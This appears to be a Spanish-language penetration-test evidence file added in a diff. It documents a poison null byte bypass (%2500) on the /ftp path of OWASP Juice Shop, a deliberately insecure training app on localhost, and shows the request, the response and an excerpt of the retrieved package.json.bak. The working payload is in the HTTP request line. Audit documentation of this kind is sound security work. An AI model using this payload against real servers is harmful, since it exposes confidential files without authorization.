@@ -1,0 +1,58 @@
+================================================================================
+EVIDENCIA TÉCNICA 3: PATH TRAVERSAL / POISON NULL BYTE (OWASP A01:2021 / API1:2023)
+Target: /ftp/package.json.bak%2500.md
+Fecha de Auditoría: 2026-10-28 18:21:54 UTC
+================================================================================
+
+--- HTTP REQUEST ---
+GET /ftp/package.json.bak%2500.md HTTP/1.1
+Host: localhost:3000
+User-Agent: OWASP_ZAP_DAST_Scanner/2.14
+Accept: */*
+
+--- HTTP RESPONSE (Status: 200 OK) ---
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Accept-Ranges: bytes
+Cache-Control: public, max-age=0
+Last-Modified: Mon, 12 Oct 2026 14:50:15 GMT
+ETag: W/"10a7-1a13097c458"
+Content-Type: application/octet-stream
+Content-Length: 4263
+Date: Wed, 28 Oct 2026 17:21:54 GMT
+Connection: close
+
+EXTRACTO DEL ARCHIVO CONFIDENCIAL EXFILTRADO (package.json.bak):
+{
+  "name": "juice-shop",
+  "version": "6.2.0-SNAPSHOT",
+  "description": "An intentionally insecure JavaScript Web Application",
+  "homepage": "http://owasp-juice.shop",
+  "author": "Björn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.de)",
+  "contributors": [
+    "Björn Kimminich",
+    "Jannik Hollenbach",
+    "Aashish683",
+    "greenkeeper[bot]",
+    "MarcRler",
+    "agrawalarpit14",
+    "Scar26",
+    "CaptainFreak",
+    "Supratik Das",
+    "JuiceShopBot",
+    "the-pro",
+    "Ziyang Li",
+    "aaryan10",
+    "m4l1c3",
+    "Timo Pagel",
+    "..."
+  ],
+  "private": true,
+
+ANÁLISIS DE IMPACTO:
+El servidor valida incorrectamente la extensión final (.md), pero el intérprete subyacente trunca
+la cadena en el byte nulo URL-decodificado (%00), permitiendo la descarga arbitraria del código fuente
+y configuración interna de dependencias del servidor universitario.
